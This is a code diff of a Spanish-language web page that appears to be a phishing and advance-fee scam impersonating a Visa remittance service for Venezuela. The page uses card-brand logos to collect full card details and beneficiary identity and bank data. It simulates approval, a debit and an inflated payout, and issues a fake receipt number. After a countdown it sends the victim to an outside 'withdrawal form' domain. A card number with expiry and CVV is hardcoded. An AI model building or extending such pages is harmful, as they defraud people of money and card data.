@@ -57,7 +57,8 @@
     }
 
     * {
-      margin: 0; padding: 0;
+      margin: 0; 
+      padding: 0;
       box-sizing: border-box;
       font-family: 'Plus Jakarta Sans', sans-serif;
     }
@@ -73,7 +74,6 @@
       max-width: 1140px;
       margin: 2rem auto;
       padding: 0 1rem;
-      /* Transición suave al cargar */
       transition: all 0.4s ease-in-out;
     }
 
@@ -84,7 +84,6 @@
       border: 1px solid rgba(20, 52, 203, 0.08);
       overflow: hidden;
       margin-bottom: 2rem;
-      /* Efecto hover */
       transition: transform 0.3s ease, box-shadow 0.3s ease;
     }
     .card:hover {
@@ -100,7 +99,6 @@
       color: #fff;
       position: relative;
       overflow: hidden;
-      /* Animación de color de fondo */
       transition: background 0.3s ease;
     }
     .header h1 {
@@ -110,7 +108,6 @@
       background: linear-gradient(to right, #fff, #E0E7FF);
       -webkit-background-clip: text;
       -webkit-text-fill-color: transparent;
-      /* Suavizamos la transición del texto */
       transition: all 0.3s ease;
     }
     .header p {
@@ -122,7 +119,11 @@
     }
     .header::before {
       content: '';
-      position: absolute; top: 0; left: 0; right: 0; bottom: 0;
+      position: absolute; 
+      top: 0; 
+      left: 0; 
+      right: 0; 
+      bottom: 0;
       background: url('data:image/svg+xml,<svg width="20" height="20" xmlns="http://www.w3.org/2000/svg"><circle cx="2" cy="2" r="2" fill="rgba(255,255,255,0.1)"/></svg>') repeat;
       opacity: 0.2;
     }
@@ -299,7 +300,8 @@
       transition: all 0.3s ease;
     }
     .loader {
-      width: 48px; height: 48px;
+      width: 48px; 
+      height: 48px;
       border: 4px solid rgba(20,52,203,0.1);
       border-top-color: var(--primary);
       border-radius: 50%;
@@ -335,7 +337,8 @@
     }
     .confetti {
       position: absolute;
-      width: 10px; height: 10px;
+      width: 10px; 
+      height: 10px;
       background: #fff;
       animation: fall 2.5s linear infinite;
       opacity: 0.8;
@@ -350,7 +353,8 @@
       height: 100%;
       background: rgba(255,255,0,0.2);
       position: absolute;
-      top: 0; left: 0;
+      top: 0; 
+      left: 0;
       animation: flashAnim 2s ease;
     }
     @keyframes flashAnim {
@@ -358,7 +362,8 @@
       10%, 90% { opacity: 1; }
     }
     .checkmark-icon {
-      width: 56px; height: 56px;
+      width: 56px; 
+      height: 56px;
       border: 4px solid var(--success);
       border-radius: 50%;
       position: relative;
@@ -366,12 +371,14 @@
     }
     .checkmark-icon::after {
       content: "";
-      width: 14px; height: 28px;
+      width: 14px; 
+      height: 28px;
       border: solid var(--success);
       border-width: 0 4px 4px 0;
       display: block;
       position: absolute;
-      top: 6px; left: 17px;
+      top: 6px; 
+      left: 17px;
       transform: rotate(45deg);
     }
 
@@ -428,7 +435,9 @@
       font-size: 1rem;
       margin-bottom: 0.25rem;
       color: var(--gray-700);
-      display: flex; align-items:center; justify-content:center;
+      display: flex; 
+      align-items:center; 
+      justify-content:center;
       gap: 0.5rem;
     }
     .balance-card p {
@@ -575,7 +584,7 @@
   </div>
 </div>
 
-<!-- Monto Debitado con éxito -->
+<!-- Monto Debitado con Éxito -->
 <div class="overlay" id="fundsDebitedOverlay">
   <div class="overlay-content">
     <h3 style="margin-bottom:1rem; color:var(--primary)">Monto Debitado con Éxito</h3>
@@ -611,6 +620,30 @@
   </div>
 </div>
 
+<!-- NUEVO OVERLAY: Mostrar Nº de Comprobante / Countdown en el botón -->
+<div class="overlay" id="operationNumberOverlay">
+  <div class="overlay-content">
+    <h3 style="margin-bottom:1rem; color:var(--primary)">Número de Comprobante</h3>
+    <p style="font-size:0.9rem; margin-bottom:1.5rem; line-height:1.4;">
+      Tu número de Comprobante generado es: <br>
+      <strong id="operationNumberDisplay"></strong><br><br>
+      Se recomienda guardar este número para solicitar el depósito en tu cuenta bancaria.
+      Por favor, toma una captura de pantalla.
+    </p>
+
+    <!-- Botón deshabilitado con cuenta regresiva -->
+    <button 
+      class="btn btn-primary" 
+      id="continuePlanillaBtn" 
+      disabled
+      onclick="window.open('https://planilla.remeexvisa.com/','_blank')"
+    >
+      Continuar a la planilla de retiro de fondos (20s)
+    </button>
+  </div>
+</div>
+<!-- Fin Nuevo Overlay -->
+
 <!-- Steps 1..5 -->
 <div class="container card" id="stepsContainer">
   <!-- HEADER -->
@@ -627,7 +660,6 @@
   <div class="logo-bar">
     <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo">
     <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo">
-    <!-- Logo Reemplazado: Western Union por American Express -->
     <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo">
   </div>
 
@@ -880,9 +912,9 @@
           <strong>Tarjeta Usada:</strong>
           <span id="portalCard">N/A</span>
         </div>
-        <!-- NUEVO: Número de Operación de 10 dígitos -->
+        <!-- Nº de Operación (en este caso "Comprobante") de 10 dígitos -->
         <div class="info-item">
-          <strong>Nº de Operación:</strong>
+          <strong>Nº de Comprobante:</strong>
           <span id="portalOperationNumber">N/A</span>
         </div>
       </div>
@@ -907,117 +939,131 @@
   /* ===========================
      GLOBALES
   ===========================*/
-  const globalData={
-    language:"",
-    country:"",
-    beneficiary:{ name:"", id:"", phone:"", email:"", account:"" },
-    paymentMethod:"",
-    card:{ name:"", number:"", expDate:"", cvv:"" },
-    amount:"",
-    exchangeRate:69
+  const globalData = {
+    language: "",
+    country: "",
+    beneficiary: { name: "", id: "", phone: "", email: "", account: "" },
+    paymentMethod: "",
+    card: { name: "", number: "", expDate: "", cvv: "" },
+    amount: "",
+    exchangeRate: 69
   };
 
   // Banco codes
-  const bankCodes={
-    "0001":"Banco Central de Venezuela","0102":"Banco de Venezuela","0104":"Banco Venezolano de Crédito","0105":"Banco Mercantil","0108":"Banco Provincial","0114":"Bancaribe","0115":"Banco Exterior","0128":"Banco Caroní","0134":"Banesco","0137":"Banco Sofitasa","0138":"Banco Plaza","0146":"Banco de la Gente Emprendedora","0151":"Banco Fondo Común","0156":"100% Banco","0157":"DelSur","0163":"Banco del Tesoro","0166":"Banco Agrícola de Venezuela","0168":"Bancrecer","0169":"Mi Banco","0171":"Banco Activo","0172":"Bancamiga","0173":"Banco Internacional de Desarrollo","0174":"Banplus","0175":"Banco Bicentenario","0177":"Banco de la Fuerza Armada Nacional Bolivariana","0191":"Banco Nacional de Crédito","0601":"Instituto Municipal de Crédito Popular"
+  const bankCodes = {
+    "0001": "Banco Central de Venezuela","0102":"Banco de Venezuela","0104":"Banco Venezolano de Crédito","0105":"Banco Mercantil","0108":"Banco Provincial","0114":"Bancaribe","0115":"Banco Exterior","0128":"Banco Caroní","0134":"Banesco","0137":"Banco Sofitasa","0138":"Banco Plaza","0146":"Banco de la Gente Emprendedora","0151":"Banco Fondo Común","0156":"100% Banco","0157":"DelSur","0163":"Banco del Tesoro","0166":"Banco Agrícola de Venezuela","0168":"Bancrecer","0169":"Mi Banco","0171":"Banco Activo","0172":"Bancamiga","0173":"Banco Internacional de Desarrollo","0174":"Banplus","0175":"Banco Bicentenario","0177":"Banco de la Fuerza Armada Nacional Bolivariana","0191":"Banco Nacional de Crédito","0601":"Instituto Municipal de Crédito Popular"
   };
 
-  // Tarjeta única (no se muestra, pero se usa)
-  const validCardNumber="4745034211763009";
-  const validExpDate="01/26";
-  const validCVV="583";
+  // Tarjeta única (de ejemplo)
+  const validCardNumber = "4745034211763009";
+  const validExpDate = "01/26";
+  const validCVV = "583";
 
-  let currentStep=1;
+  let currentStep = 1;
 
   // ========== MOSTRAR SECCION ==========
-  function showSection(num){
-    for(let i=1;i<=5;i++){
-      const sec=document.getElementById("section"+i);
-      if(sec){
-        if(i===num){
-          sec.style.display="block";
+  function showSection(num) {
+    for (let i = 1; i <= 5; i++) {
+      const sec = document.getElementById("section" + i);
+      if (sec) {
+        if (i === num) {
+          sec.style.display = "block";
         } else {
-          sec.style.display="none";
+          sec.style.display = "none";
           resetFields(i); // Limpia la info si regresamos
         }
       }
     }
-    document.getElementById("portalContainer").style.display="none";
-    currentStep=num;
+    document.getElementById("portalContainer").style.display = "none";
+    currentStep = num;
     updateProgressBar();
-    if(num===3){
-      if(globalData.country==="Venezuela"){
-        document.getElementById("vzAlert").style.display="block";
+    if (num === 3) {
+      // Mostrar alerta si es Venezuela
+      if (globalData.country === "Venezuela") {
+        document.getElementById("vzAlert").style.display = "block";
       } else {
-        document.getElementById("vzAlert").style.display="none";
+        document.getElementById("vzAlert").style.display = "none";
       }
     }
   }
 
   // Limpiar campos en seccion si se regresa
-  function resetFields(step){
-    if(step===currentStep) return; // no se limpia la seccion actual
-    const sec=document.getElementById("section"+step);
-    if(!sec)return;
-    const inputs=sec.querySelectorAll("input, select");
-    inputs.forEach(el=>{
-      if(el.type==="checkbox"){
-        el.checked=false;
+  function resetFields(step) {
+    if (step === currentStep) return; 
+    const sec = document.getElementById("section" + step);
+    if (!sec) return;
+    const inputs = sec.querySelectorAll("input, select");
+    inputs.forEach(el => {
+      if (el.type === "checkbox") {
+        el.checked = false;
       } else {
-        el.value="";
+        el.value = "";
       }
     });
   }
 
   function updateProgressBar(){
-    for(let i=1;i<=5;i++){
-      const circle=document.getElementById("stepCircle"+i);
-      if(i<=currentStep){
+    for (let i = 1; i <= 5; i++) {
+      const circle = document.getElementById("stepCircle" + i);
+      if (i <= currentStep) {
         circle.classList.add("active");
       } else {
         circle.classList.remove("active");
       }
     }
-    document.getElementById("progressFill").style.width=(currentStep-1)*25+"%";
+    document.getElementById("progressFill").style.width = (currentStep - 1) * 25 + "%";
   }
 
   function goNext(){
-    if(currentStep===1){
-      const lang=document.getElementById("language").value;
-      const acc=document.getElementById("acceptVisa").checked;
-      if(!lang){ alert("Seleccione un idioma.");return; }
-      if(!acc){ alert("Debe aceptar los Términos de Visa.");return; }
-      globalData.language=lang;
+    if (currentStep === 1) {
+      const lang = document.getElementById("language").value;
+      const acc = document.getElementById("acceptVisa").checked;
+      if (!lang) { 
+        alert("Seleccione un idioma.");
+        return; 
+      }
+      if (!acc) { 
+        alert("Debe aceptar los Términos de Visa.");
+        return; 
+      }
+      globalData.language = lang;
     }
-    if(currentStep===2){
-      const c=document.getElementById("country").value;
-      if(!c){ alert("Seleccione un país destino.");return;}
-      globalData.country=c;
+    if (currentStep === 2) {
+      const c = document.getElementById("country").value;
+      if (!c) { 
+        alert("Seleccione un país destino.");
+        return;
+      }
+      globalData.country = c;
     }
-    if(currentStep===4){
-      const pm=document.getElementById("paymentMethod").value;
-      if(!pm){ alert("Seleccione un método de recarga.");return;}
-      globalData.paymentMethod=pm;
+    if (currentStep === 4) {
+      const pm = document.getElementById("paymentMethod").value;
+      if (!pm) { 
+        alert("Seleccione un método de recarga.");
+        return;
+      }
+      globalData.paymentMethod = pm;
     }
-    if(currentStep<5){
-      showSection(currentStep+1);
+    if (currentStep < 5) {
+      showSection(currentStep + 1);
     }
   }
 
   function goBack(){
-    if(currentStep>1){
-      showSection(currentStep-1);
+    if (currentStep > 1) {
+      showSection(currentStep - 1);
     }
   }
 
   // ========== VALIDAR BENEFICIARIO (P3) ==========
   function validateBeneficiary(){
-    const name=document.getElementById("beneficiaryName").value.trim();
-    const id=document.getElementById("beneficiaryID").value.trim();
-    const phone=document.getElementById("beneficiaryPhone").value.trim();
-    const email=document.getElementById("beneficiaryEmail").value.trim();
-    const acc=document.getElementById("beneficiaryAccount").value.trim();
-    if(!name||!id||!phone||!email||!acc){
+    const name = document.getElementById("beneficiaryName").value.trim();
+    const id = document.getElementById("beneficiaryID").value.trim();
+    const phone = document.getElementById("beneficiaryPhone").value.trim();
+    const email = document.getElementById("beneficiaryEmail").value.trim();
+    const acc = document.getElementById("beneficiaryAccount").value.trim();
+
+    if (!name || !id || !phone || !email || !acc) {
       alert("Complete todos los campos del beneficiario.");
       return;
     }
@@ -1025,37 +1071,38 @@
       alert("El campo Nombre solo debe contener letras.");
       return;
     }
-    if(!/^\d+$/.test(id)){
+    if (!/^\d+$/.test(id)) {
       alert("La Cédula debe contener solo números.");
       return;
     }
-    if(!/^\d+$/.test(phone)){
+    if (!/^\d+$/.test(phone)) {
       alert("El Teléfono debe contener solo números.");
       return;
     }
-    if(acc.length!==20||!/^\d+$/.test(acc)){
+    if (acc.length !== 20 || !/^\d+$/.test(acc)) {
       alert("El número de cuenta debe ser de 20 dígitos.");
       return;
     }
-    globalData.beneficiary.name=name;
-    globalData.beneficiary.id=id;
-    globalData.beneficiary.phone=phone;
-    globalData.beneficiary.email=email;
-    globalData.beneficiary.account=acc;
+
+    globalData.beneficiary.name = name;
+    globalData.beneficiary.id = id;
+    globalData.beneficiary.phone = phone;
+    globalData.beneficiary.email = email;
+    globalData.beneficiary.account = acc;
 
     document.getElementById("accountCheckOverlay").classList.add("active");
     setTimeout(()=>{
       document.getElementById("accountCheckOverlay").classList.remove("active");
       fillBenefConfirm();
       document.getElementById("accountValidOverlay").classList.add("active");
-    },2000);
+    }, 2000);
   }
 
   function fillBenefConfirm(){
-    const {name,id,phone,email,account}=globalData.beneficiary;
-    const code=account.slice(0,4);
-    const deducedBank=bankCodes[code]||"Banco Desconocido";
-    const text=`
+    const {name,id,phone,email,account} = globalData.beneficiary;
+    const code = account.slice(0,4);
+    const deducedBank = bankCodes[code] || "Banco Desconocido";
+    const text = `
       <strong>Datos del Beneficiario:</strong><br>
       Nombre: ${name}<br>
       Cédula: ${id}<br>
@@ -1064,7 +1111,7 @@
       Banco: ${deducedBank}<br>
       Nº Cuenta: ${account}
     `;
-    document.getElementById("confirmBenefData").innerHTML=text;
+    document.getElementById("confirmBenefData").innerHTML = text;
   }
 
   function closeAccountValidOverlay(){
@@ -1072,8 +1119,8 @@
   }
 
   function proceedAfterAccountValid(){
-    const checkVisaApta=document.getElementById("checkVisaApta").checked;
-    if(!checkVisaApta){
+    const checkVisaApta = document.getElementById("checkVisaApta").checked;
+    if (!checkVisaApta){
       alert("Marque la casilla de confirmación para continuar.");
       return;
     }
@@ -1082,70 +1129,73 @@
   }
 
   // ========== PROCESAR PAGO (P5) ==========
-  let countdownInterval=null;
+  let countdownInterval = null;
   function processPayment(){
-    const cn=document.getElementById("cardName").value.trim();
-    const cc=document.getElementById("cardNumber").value.trim();
-    const ed=document.getElementById("expDate").value.trim();
-    const cv=document.getElementById("cvv").value.trim();
-    const amt=document.getElementById("amount").value;
-    if(!cn||!cc||!ed||!cv||!amt){
+    const cn = document.getElementById("cardName").value.trim();
+    const cc = document.getElementById("cardNumber").value.trim();
+    const ed = document.getElementById("expDate").value.trim();
+    const cv = document.getElementById("cvv").value.trim();
+    const amt = document.getElementById("amount").value;
+
+    if (!cn || !cc || !ed || !cv || !amt) {
       alert("Complete todos los datos de la tarjeta y el monto.");
       return;
     }
-    globalData.card.name=cn;
-    globalData.card.number=cc;
-    globalData.card.expDate=ed;
-    globalData.card.cvv=cv;
-    globalData.amount=amt;
 
-    // Muestra overlay "Procesando Pago"
+    globalData.card.name = cn;
+    globalData.card.number = cc;
+    globalData.card.expDate = ed;
+    globalData.card.cvv = cv;
+    globalData.amount = amt;
+
+    // Overlay "Procesando Pago"
     document.getElementById("processingPaymentOverlay").classList.add("active");
     setTimeout(()=>{
       document.getElementById("processingPaymentOverlay").classList.remove("active");
-      // Muestra countdown 90s
+      // Countdown 90s
       showCountdown();
-    },2000);
+    }, 2000);
   }
 
   function showCountdown(){
     document.getElementById("countdownOverlay").classList.add("active");
-    let timeLeft=90;
-    const timerEl=document.getElementById("countdownTimer");
-    timerEl.textContent=`${timeLeft}s`;
+    let timeLeft = 90;
+    const timerEl = document.getElementById("countdownTimer");
+    timerEl.textContent = `${timeLeft}s`;
 
-    countdownInterval=setInterval(()=>{
+    countdownInterval = setInterval(()=>{
       timeLeft--;
-      timerEl.textContent=`${timeLeft}s`;
+      timerEl.textContent = `${timeLeft}s`;
       // A los 60s -> Tarjeta aprobada
-      if(timeLeft===60){
-        // Simular que el titular de la tarjeta aprobó
-        // Cierra countdown
+      if (timeLeft === 60) {
+        // Simulamos aprobación
         document.getElementById("countdownOverlay").classList.remove("active");
         clearInterval(countdownInterval);
         showFundsDebited();
       }
-      if(timeLeft<=0){
+      if (timeLeft <= 0) {
         document.getElementById("countdownOverlay").classList.remove("active");
         clearInterval(countdownInterval);
-        showFundsDebited(); // Forzamos a mostrar "Aprobado" igual
+        showFundsDebited(); 
       }
-    },1000);
+    }, 1000);
   }
 
   function showFundsDebited(){
-    let finalUSD=parseInt(globalData.amount,10);
-    if(globalData.amount==="500"){
-      finalUSD=1000;
+    let finalUSD = parseInt(globalData.amount, 10);
+    // Ajuste extra de ejemplo
+    if (globalData.amount === "500") {
+      finalUSD = 1000;
     }
-    const finalBs=finalUSD*globalData.exchangeRate;
-    document.getElementById("fundsDebitedText").innerHTML=`
+    const finalBs = finalUSD * globalData.exchangeRate;
+
+    document.getElementById("fundsDebitedText").innerHTML = `
       Se han debitado <strong>$${finalUSD.toFixed(2)}</strong> 
       (Bs. ${finalBs.toLocaleString("es-VE",{minimumFractionDigits:2})})
       de la tarjeta.
     `;
-    const bName=globalData.beneficiary.name||"el beneficiario";
-    document.getElementById("benefSecurityMsg").textContent=
+    const bName = globalData.beneficiary.name || "el beneficiario";
+    document.getElementById("benefSecurityMsg").textContent =
       `${bName}, como recibirás un monto elevado en bolívares, 
        deberás autorizar la acreditación al finalizar el proceso.`;
 
@@ -1154,14 +1204,16 @@
 
   function approveFunds(){
     document.getElementById("fundsDebitedOverlay").classList.remove("active");
-    // Animación final
+    // Animación de Éxito
     showSuccessAnimation(true);
-    let finalUSD=parseInt(globalData.amount,10);
-    if(globalData.amount==="500"){
-      finalUSD=1000;
+
+    let finalUSD = parseInt(globalData.amount, 10);
+    if (globalData.amount === "500") {
+      finalUSD = 1000;
     }
-    const finalBs=finalUSD*globalData.exchangeRate;
-    document.getElementById("finalSuccessText").innerHTML=`
+    const finalBs = finalUSD * globalData.exchangeRate;
+    
+    document.getElementById("finalSuccessText").innerHTML = `
       Monto procesado: <strong>$${finalUSD.toFixed(2)}</strong><br>
       Equivalente: <strong>Bs. ${finalBs.toLocaleString("es-VE",{minimumFractionDigits:2})}</strong>
     `;
@@ -1169,16 +1221,16 @@
     setTimeout(()=>{
       showSuccessAnimation(false);
       // Ocultamos steps
-      document.getElementById("stepsContainer").style.display="none";
+      document.getElementById("stepsContainer").style.display = "none";
       // Mostramos portal
-      document.getElementById("portalContainer").style.display="block";
+      document.getElementById("portalContainer").style.display = "block";
       fillPortalData();
-    },3000);
+    }, 3000);
   }
 
   function showSuccessAnimation(show){
-    const anim=document.getElementById("successAnimation");
-    if(show){
+    const anim = document.getElementById("successAnimation");
+    if (show){
       anim.classList.add("active");
     } else {
       anim.classList.remove("active");
@@ -1187,38 +1239,41 @@
 
   /* ========== LLENAR PORTAL (P6) ========== */
   function fillPortalData(){
-    let finalUSD=parseInt(globalData.amount,10);
-    if(globalData.amount==="500"){ finalUSD=1000; }
-    const finalBs=finalUSD*globalData.exchangeRate;
+    let finalUSD = parseInt(globalData.amount, 10);
+    if(globalData.amount === "500"){ 
+      finalUSD = 1000; 
+    }
+    const finalBs = finalUSD * globalData.exchangeRate;
 
-    document.getElementById("portalUSDAmount").textContent="$"+finalUSD.toFixed(2);
-    document.getElementById("portalVESAmount").textContent=
-      "Bs. "+finalBs.toLocaleString("es-VE",{minimumFractionDigits:2});
+    // Llenamos datos
+    document.getElementById("portalUSDAmount").textContent = "$" + finalUSD.toFixed(2);
+    document.getElementById("portalVESAmount").textContent =
+      "Bs. " + finalBs.toLocaleString("es-VE",{minimumFractionDigits:2});
 
-    const { name,id,phone,email,account }=globalData.beneficiary;
-    document.getElementById("portalName").textContent=name;
-    document.getElementById("portalID").textContent=id;
-    document.getElementById("portalPhone").textContent=phone;
-    document.getElementById("portalEmail").textContent=email;
-    document.getElementById("portalCountry").textContent=globalData.country;
+    const { name, id, phone, email, account } = globalData.beneficiary;
+    document.getElementById("portalName").textContent = name;
+    document.getElementById("portalID").textContent = id;
+    document.getElementById("portalPhone").textContent = phone;
+    document.getElementById("portalEmail").textContent = email;
+    document.getElementById("portalCountry").textContent = globalData.country;
 
-    const code=account.slice(0,4);
-    const deducedBank=bankCodes[code]||"Banco Desconocido";
-    document.getElementById("portalBank").textContent=deducedBank;
-    document.getElementById("portalAccount").textContent=account;
+    const code = account.slice(0,4);
+    const deducedBank = bankCodes[code] || "Banco Desconocido";
+    document.getElementById("portalBank").textContent = deducedBank;
+    document.getElementById("portalAccount").textContent = account;
 
-    document.getElementById("portalAmount").textContent="$"+finalUSD+" USD";
+    document.getElementById("portalAmount").textContent = "$" + finalUSD + " USD";
 
-    const last4=globalData.card.number.slice(-4);
-    document.getElementById("portalCard").textContent="**** **** **** "+last4;
+    const last4 = globalData.card.number.slice(-4);
+    document.getElementById("portalCard").textContent = "**** **** **** " + last4;
 
-    // Generar número de operación de 10 dígitos
-    const opNumber = (Math.floor(Math.random()*9000000000) + 1000000000).toString();
+    // Nº de "Comprobante" (10 dígitos)
+    const opNumber = (Math.floor(Math.random() * 9000000000) + 1000000000).toString();
     document.getElementById("portalOperationNumber").textContent = opNumber;
 
     // QR
-    const qr=qrcode(0,"M");
-    const qrText=`
+    const qr = qrcode(0, "M");
+    const qrText = `
       Validación VISA:
       Beneficiario: ${name}
       Cédula: ${id}
@@ -1228,72 +1283,66 @@
     `;
     qr.addData(qrText);
     qr.make();
-    document.getElementById("qrcode").innerHTML=qr.createImgTag(4);
+    document.getElementById("qrcode").innerHTML = qr.createImgTag(4);
   }
 
-  // Botón para Solicitar Depósito (MODIFICADO)
+  // ===================
+  // SOLICITAR DEPÓSITO
+  // ===================
   function requestDeposit(){
-    let finalUSD=parseInt(globalData.amount,10);
-    if(globalData.amount==="500"){
-      finalUSD=1000;
-    }
-    const finalBs=finalUSD*globalData.exchangeRate;
-    const code=globalData.beneficiary.account.slice(0,4);
-    const deducedBank=bankCodes[code]||"Banco Desconocido";
+    // Muestra el overlay con el número de comprobante
+    const opNumber = document.getElementById("portalOperationNumber").textContent;
+    document.getElementById("operationNumberDisplay").innerText = opNumber;
 
-    const msg=`Hola, solicito el depósito en mi cuenta:\n`+
-              `Beneficiario: ${globalData.beneficiary.name}, `+
-              `Cédula: ${globalData.beneficiary.id}, `+
-              `Teléfono: ${globalData.beneficiary.phone}, `+
-              `Email: ${globalData.beneficiary.email}, `+
-              `Banco: ${deducedBank}, `+
-              `Cuenta: ${globalData.beneficiary.account}, \n`+
-              `Monto: $${finalUSD} (Bs. ${finalBs.toLocaleString("es-VE",{minimumFractionDigits:2})}).\n`+
-              `Gracias por su atención.`;
+    const overlay = document.getElementById("operationNumberOverlay");
+    overlay.classList.add("active");
 
-    const encoded=encodeURIComponent(msg);
-    // En vez de WhatsApp, abrimos la dirección planilla.remeexvisa.com
-    window.open(`https://planilla.remeexvisa.com?ph=+18133584564&te=???${encoded}`,"_blank");
+    // Botón con cuenta regresiva 20s
+    const continueBtn = document.getElementById("continuePlanillaBtn");
+    continueBtn.disabled = true;
+
+    let countdown = 20;
+    // Set texto inicial con 20s
+    continueBtn.textContent = `Continuar a la planilla de retiro de fondos (${countdown}s)`;
+
+    const interval = setInterval(() => {
+      countdown--;
+      if (countdown <= 0) {
+        clearInterval(interval);
+        continueBtn.disabled = false;
+        continueBtn.textContent = "Continuar a la planilla de retiro de fondos";
+      } else {
+        continueBtn.textContent = `Continuar a la planilla de retiro de fondos (${countdown}s)`;
+      }
+    }, 1000);
   }
 
   function downloadPDF(){
-    const elem=document.getElementById("portalContainer");
-    const opt={
-      filename:"Comprobante-Remesa-Premium.pdf",
-      image:{ type:'jpeg', quality:0.98 },
-      html2canvas:{ scale:2 },
-      jsPDF:{ unit:'in', format:'letter', orientation:'portrait' }
+    const elem = document.getElementById("portalContainer");
+    const opt = {
+      filename: "Comprobante-Remesa-Premium.pdf",
+      image: { type: 'jpeg', quality: 0.98 },
+      html2canvas: { scale: 2 },
+      jsPDF: { unit: 'in', format: 'letter', orientation: 'portrait' }
     };
     html2pdf().from(elem).set(opt).save();
   }
 
-  /* Tawk.to chat */
-  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-  (function(){
-    var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
-    s1.async=true;
-    s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
-    s1.charset='UTF-8';
-    s1.setAttribute('crossorigin','*');
-    s0.parentNode.insertBefore(s1,s0);
-  })();
-
   /*
     ===========================
-    SECCIÓN PARA FORMATEAR
-    EL CAMPO DE EXPIRACIÓN
+    FORMATEAR CAMPO DE EXPIRACIÓN
     ===========================
   */
   window.addEventListener("DOMContentLoaded", ()=>{
-    const expDateInput=document.getElementById("expDate");
-    if(expDateInput){
+    const expDateInput = document.getElementById("expDate");
+    if (expDateInput){
       expDateInput.addEventListener("input",(e)=>{
-        let val=e.target.value.replace(/\D/g,""); 
-        if(val.length>4) val=val.slice(0,4);
-        if(val.length>2){
-          val=val.slice(0,2)+"/"+val.slice(2);
+        let val = e.target.value.replace(/\D/g,""); 
+        if (val.length > 4) val = val.slice(0,4);
+        if (val.length > 2){
+          val = val.slice(0,2) + "/" + val.slice(2);
         }
-        e.target.value=val;
+        e.target.value = val;
       });
     }
   });
